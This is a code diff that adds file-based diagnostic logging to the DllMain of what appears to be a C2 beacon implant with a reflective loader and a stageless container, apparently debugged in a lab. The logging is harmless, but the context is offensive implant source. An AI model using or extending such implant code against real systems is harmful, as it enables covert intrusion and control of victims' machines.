@@ -153,6 +153,17 @@ typedef struct {
 
 static SYSCALL_API_UD g_udrl_syscalls = { NULL, 0 };
 
+/* BW_DIAG 前导链标记（定位 LLVM 版 pre-beacon 崩溃点） */
+static void bw_diag2(const char *stage) {
+	HANDLE h = CreateFileA("C:\\lab\\diag2.txt", GENERIC_WRITE, FILE_SHARE_READ,
+		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (h == INVALID_HANDLE_VALUE) return;
+	SetFilePointer(h, 0, NULL, FILE_END);
+	char buf[80];
+	int n = _snprintf(buf, sizeof(buf), "[%u] %s\r\n", GetTickCount(), stage);
+	DWORD w; WriteFile(h, buf, n, &w, NULL);
+	CloseHandle(h);
+}
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 	MEMORY_BASIC_INFORMATION mbi;
 
@@ -178,6 +189,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			register_exception_tables(hinstDLL);
 			break;
 		case DLL_METASPLOIT_ATTACH:
+			bw_diag2("rdll_enter");
 			/* 契约：本分支不得返回到调用方。stageless 容器（artifact64big.exe）的 stub
 			   对入口是阻塞调用：`call rax` 之后紧跟归零的 DOS 头字节，若从此处返回，
 			   stub 线程会执行 `00 00`（add [rax],al）并以 0xC0000005 崩溃。
@@ -188,10 +200,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			   缺陷返回，显式结束线程，杜绝跌落。 */
 			settings_init_once(hinstDLL);
 			register_exception_tables(hinstDLL);
+			bw_diag2("post_settings");
 
 			/* P4: drop the container's decode buffer (full PE copy of us)
 			   before the beacon loop starts - see container_release() */
 			container_release(lpReserved, hinstDLL);
+			bw_diag2("post_container");
 
 			/* clean up our loader（legacy 非映像加载路径：CLEANUP=1 且镜像为
 			   VirtualAlloc 私有内存时释放自身；映像-backed 路径 CLEANUP=0） */
@@ -206,6 +220,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			}
 
 			/* start our beaconing process, please!（不返回：循环 + safe_exit 终止） */
+			bw_diag2("pre_beacon");
 			beacon(lpReserved);
 
 			/* 防御性兜底：正常情况下不可达（见上）。 */
